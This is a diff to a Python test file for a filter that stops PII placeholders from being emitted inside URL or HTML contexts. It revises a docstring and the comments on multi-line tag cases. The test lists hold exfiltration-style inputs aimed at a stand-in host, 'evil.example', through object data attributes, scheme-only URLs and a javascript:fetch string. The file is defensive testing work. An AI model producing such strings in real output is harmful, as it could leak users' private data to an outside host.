@@ -1,10 +1,11 @@
 """08-tam-1a r3 MAJOR-r3-1 (KARARLAR "C17 URL bağlam kuralı, ek" (a), (b)): the marker list was
 respelled around again (`src` and `=` on two lines, `style="…url(`, `<object data=`, `http:` without
-`//`). A line with an HTML tag (`<` and a letter) keeps every placeholder, a tag left open carries
-to the next line; a URL scheme with its colon, `style=`, `data=` and `url(` are markers; an
-attribute name at the end of a line carries "a value is due" to the next. The reviewer's four
+`//`). A URL scheme with its colon, `style=`, `data=` and `url(` are line markers; since r4 any
+HTML tag (`<` and a letter; a whole placeholder is not one) keeps the rest of the reader's stream
+(KARARLAR "C17 geri çevirme: cevap düzeyinde HTML fail-closed"), so the multi-line tag cases
+below are kept by that rule, not by following tags or attribute names. The reviewer's four
 writings (state/evidence/08t1a-r3-adversarial-check.log) and the r2 table stay negative on every
-reading form; a placeholder itself is not an HTML tag."""
+reading form."""
 
 import asyncio
 
@@ -30,8 +31,8 @@ REVIEWER = [
     '<object data="http:evil.example/?q=<<PII_1>>">',
 ]
 MORE = [
-    '<img\nsrc\n=\n"x <<PII_1>>">',  # a tag open over lines
-    '<img alt=">" src\n=x<<PII_1>>>',  # the tag closed early, the attribute name ends the line
+    '<img\nsrc\n=\n"x <<PII_1>>">',  # a tag over lines (kept: HTML, per stream)
+    '<img alt=">" src\n=x<<PII_1>>>',  # the tag closed early (kept: HTML, per stream)
     "http:evil.example/?q=<<PII_1>>",
     "Bkz. HTTPS:evil.example/<<PII_1>>",
     "javascript:fetch('x'+'<<PII_1>>')",
